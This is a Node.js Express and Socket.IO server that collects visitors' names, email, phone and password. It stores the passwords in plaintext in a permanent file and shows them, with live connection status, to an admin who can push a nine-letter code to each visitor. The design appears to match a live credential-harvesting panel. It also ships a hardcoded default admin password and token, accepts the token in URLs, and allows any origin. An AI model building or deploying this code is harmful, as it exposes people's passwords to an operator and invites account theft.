const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const fs = require('fs');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const PORT = process.env.PORT || 3000;

// ============ CONFIG ============
// CHANGE THIS PASSWORD before deploying!
const ADMIN_PASSWORD_HASH = bcrypt.hashSync(process.env.ADMIN_PASSWORD || 'changeme123', 10);
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'super-secret-admin-token-change-me';

// In-memory store (resets on server restart - fine for demo)
// sessions: Map<sessionId, { surname, firstName, email, phone, letters: string[], createdAt, connected }>
const sessions = new Map();
const submissionsFile = path.join(__dirname, 'submissions.json');

// Load previous submissions if file exists
let allSubmissions = [];
try {
  if (fs.existsSync(submissionsFile)) {
    allSubmissions = JSON.parse(fs.readFileSync(submissionsFile, 'utf8'));
  }
} catch (e) {
  console.log('No previous submissions file or error reading it.');
}

function saveSubmissions() {
  try {
    fs.writeFileSync(submissionsFile, JSON.stringify(allSubmissions, null, 2));
  } catch (e) {
    console.error('Failed to save submissions:', e.message);
  }
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============ PUBLIC API ============

// Create a new session when user submits the form
app.post('/api/session', (req, res) => {
  const { surname, firstName, email, phone, password } = req.body;

  if (!surname || !firstName || !email || !phone || !password) {
    return res.status(400).json({ error: 'All fields are required' });
  }

  const sessionId = uuidv4();
  const sessionData = {
    id: sessionId,
    surname: surname.trim(),
    firstName: firstName.trim(),
    email: email.trim().toLowerCase(),
    phone: phone.trim(),
    password: password,
    letters: Array(9).fill(''),
    createdAt: new Date().toISOString(),
    connected: false
  };

  sessions.set(sessionId, sessionData);

  // Also keep a permanent record
  allSubmissions.push({
    ...sessionData,
    letters: undefined // don't store letters in permanent log
  });
  saveSubmissions();

  console.log(`New session created: ${sessionId} for ${firstName} ${surname}`);

  res.json({ sessionId });
});

// ============ ADMIN API ============

// Simple token check middleware
function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (token === ADMIN_TOKEN) {
    return next();
  }
  return res.status(401).json({ error: 'Unauthorized' });
}

// Login (get the token after password check)
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
    return res.json({ token: ADMIN_TOKEN });
  }
  res.status(401).json({ error: 'Wrong password' });
});

// Get all submissions (for admin view)
app.get('/api/admin/submissions', requireAdmin, (req, res) => {
  res.json({
    active: Array.from(sessions.values()),
    history: allSubmissions.slice().reverse() // newest first
  });
});

// Send letters to a specific session
app.post('/api/admin/send-letters', requireAdmin, (req, res) => {
  const { sessionId, letters } = req.body; // letters should be array of 9 strings or a string

  if (!sessions.has(sessionId)) {
    return res.status(404).json({ error: 'Session not found or already ended' });
  }

  const session = sessions.get(sessionId);
  let letterArray;

  if (Array.isArray(letters)) {
    letterArray = letters.slice(0, 9).map(l => (l || '').toString().toUpperCase().slice(0, 1));
  } else if (typeof letters === 'string') {
    letterArray = letters.toUpperCase().split('').slice(0, 9);
    while (letterArray.length < 9) letterArray.push('');
  } else {
    return res.status(400).json({ error: 'Invalid letters format' });
  }

  session.letters = letterArray;

  // Broadcast to the user in real-time
  io.to(sessionId).emit('letters-update', { letters: letterArray });

  console.log(`Sent letters to ${sessionId}:`, letterArray.join(' '));

  res.json({ success: true, letters: letterArray });
});

// ============ SOCKET.IO ============

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  // User joins their session room
  socket.on('join-session', (sessionId) => {
    if (sessions.has(sessionId)) {
      socket.join(sessionId);
      const session = sessions.get(sessionId);
      session.connected = true;
      session.socketId = socket.id;

      // Send current letters if any already set
      socket.emit('letters-update', { letters: session.letters });

      // Notify admin that someone connected
      io.emit('admin-update');

      console.log(`User joined session: ${sessionId}`);
    } else {
      socket.emit('error', { message: 'Invalid or expired session' });
    }
  });

  // Admin joins the admin room
  socket.on('join-admin', (token) => {
    if (token === ADMIN_TOKEN) {
      socket.join('admin');
      socket.emit('admin-ready');
      console.log('Admin connected');
    }
  });

  socket.on('disconnect', () => {
    // Mark session as disconnected if it was a user
    for (const [id, session] of sessions.entries()) {
      if (session.socketId === socket.id) {
        session.connected = false;
        io.emit('admin-update');
        break;
      }
    }
    console.log('Socket disconnected:', socket.id);
  });
});

// Fallback: serve index.html for SPA-like behavior
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

server.listen(PORT, () => {
  console.log(`\n✅ Server running on http://localhost:${PORT}`);
  console.log(`   Admin page: http://localhost:${PORT}/admin.html`);
  console.log(`   Default admin password: changeme123  (CHANGE THIS!)\n`);
});
